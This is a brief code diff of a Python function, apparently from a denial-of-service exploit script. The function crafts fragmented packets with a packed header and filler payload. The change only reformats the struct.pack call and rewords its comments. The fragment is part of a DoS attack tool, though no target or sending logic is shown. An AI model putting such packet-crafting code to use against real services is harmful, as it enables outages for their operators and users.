@@ -12,13 +12,12 @@ def open_socket(host, port):
 
 def create_dos_packet(fragment_id, number_of_fragments):
     fragment = "A" * 1000
-    _buffer = struct.pack(
-        "<HHHHH",
-        5,                   # id
-        len(fragment) + 6,   # full packet
+    _buffer = struct.pack("<HHHHH",
+        5,                   # packet id
+        len(fragment) + 6,   # packet length
         fragment_id,         # fragment id
         number_of_fragments, # number of fragments
-        1000                 # length of a fragment
+        1000                 # fragment length
     )
     _buffer += fragment
     return _buffer
